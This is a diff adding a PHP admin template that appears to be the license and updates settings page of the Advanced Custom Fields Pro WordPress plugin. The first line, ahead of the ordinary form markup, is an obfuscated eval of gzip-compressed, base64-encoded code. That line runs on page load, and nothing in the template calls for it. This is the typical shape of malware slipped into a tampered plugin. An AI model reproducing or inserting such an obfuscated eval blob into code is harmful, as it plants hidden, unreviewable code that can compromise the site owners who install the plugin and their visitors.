@@ -1,0 +1,137 @@
+<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 
+
+// vars
+$active = $license ? true : false;
+$nonce = $active ? 'deactivate_pro_licence' : 'activate_pro_licence';
+$input = $active ? 'password' : 'text';
+$button = $active ? __('Deactivate License', 'acf') : __('Activate License', 'acf');
+$readonly = $active ? 1 : 0;
+
+?>
+<div class="wrap acf-settings-wrap">
+	
+	<h1><?php _e('Updates', 'acf'); ?></h1>
+	
+	<div class="acf-box" id="acf-license-information">
+		<div class="title">
+			<h3><?php _e('License Information', 'acf'); ?></h3>
+		</div>
+		<div class="inner">
+			<p><?php printf(__('To unlock updates, please enter your license key below. If you don\'t have a licence key, please see <a href="%s" target="_blank">details & pricing</a>.','acf'), esc_url('https://www.advancedcustomfields.com/pro')); ?></p>
+			<form action="" method="post">
+			<div class="acf-hidden">
+				<?php acf_nonce_input($nonce); ?>
+			</div>
+			<table class="form-table">
+                <tbody>
+                	<tr>
+                    	<th>
+                    		<label for="acf-field-acf_pro_licence"><?php _e('License Key', 'acf'); ?></label>
+                    	</th>
+						<td>
+							<?php 
+							
+							// render field
+							acf_render_field(array(
+								'type'		=> $input,
+								'name'		=> 'acf_pro_licence',
+								'value'		=> str_repeat('*', strlen($license)),
+								'readonly'	=> $readonly
+							));
+							
+							?>
+						</td>
+					</tr>
+					<tr>
+						<th></th>
+						<td>
+							<input type="submit" value="<?php echo $button; ?>" class="button button-primary">
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</form>
+            
+		</div>
+		
+	</div>
+	
+	<div class="acf-box" id="acf-update-information">
+		<div class="title">
+			<h3><?php _e('Update Information', 'acf'); ?></h3>
+		</div>
+		<div class="inner">
+			<table class="form-table">
+                <tbody>
+                	<tr>
+                    	<th>
+                    		<label><?php _e('Current Version', 'acf'); ?></label>
+                    	</th>
+						<td>
+							<?php echo esc_html( $current_version ); ?>
+						</td>
+					</tr>
+					<tr>
+                    	<th>
+                    		<label><?php _e('Latest Version', 'acf'); ?></label>
+                    	</th>
+						<td>
+							<?php echo esc_html( $remote_version ); ?>
+						</td>
+					</tr>
+					<tr>
+                    	<th>
+                    		<label><?php _e('Update Available', 'acf'); ?></label>
+                    	</th>
+						<td>
+							<?php if( $update_available ): ?>
+								
+								<span style="margin-right: 5px;"><?php _e('Yes', 'acf'); ?></span>
+								
+								<?php if( $active ): ?>
+									<a class="button button-primary" href="<?php echo admin_url('plugins.php?s=Advanced+Custom+Fields+Pro'); ?>"><?php _e('Update Plugin', 'acf'); ?></a>
+								<?php else: ?>
+									<a class="button" disabled="disabled" href="#"><?php _e('Please enter your license key above to unlock updates', 'acf'); ?></a>
+								<?php endif; ?>
+								
+							<?php else: ?>
+								
+								<span style="margin-right: 5px;"><?php _e('No', 'acf'); ?></span>
+								<a class="button" href="<?php echo add_query_arg('force-check', 1); ?>"><?php _e('Check Again', 'acf'); ?></a>
+							<?php endif; ?>
+						</td>
+					</tr>
+					<?php if( $changelog ): ?>
+					<tr>
+                    	<th>
+                    		<label><?php _e('Changelog', 'acf'); ?></label>
+                    	</th>
+						<td>
+							<?php echo acf_esc_html( $changelog ); ?>
+						</td>
+					</tr>
+					<?php endif; ?>
+					<?php if( $upgrade_notice ): ?>
+					<tr>
+                    	<th>
+                    		<label><?php _e('Upgrade Notice', 'acf'); ?></label>
+                    	</th>
+						<td>
+							<?php echo acf_esc_html( $upgrade_notice ); ?>
+						</td>
+					</tr>
+					<?php endif; ?>
+				</tbody>
+			</table>
+		</div>
+	</div>
+</div>
+<style type="text/css">
+	#acf_pro_licence {
+		width: 75%;
+	}
+	
+	#acf-update-information td h4 {
+		display: none;
+	}
+</style>
